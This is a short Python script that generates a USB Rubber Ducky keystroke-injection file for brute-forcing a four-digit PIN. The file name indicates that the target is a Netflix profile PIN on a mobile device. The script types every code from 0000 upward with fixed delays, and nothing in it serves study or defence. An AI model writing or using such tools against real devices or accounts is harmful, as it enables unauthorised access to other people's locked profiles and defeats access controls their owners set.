with open("bruteforce_pin modif pour netflix mobile2.txt", "w") as f:
    f.write("DELAY 1000\n")
    for i in range(10001):
        pin = f"{i:04}"
        f.write(f"STRING {pin}\n")
        f.write("DELAY 500\n")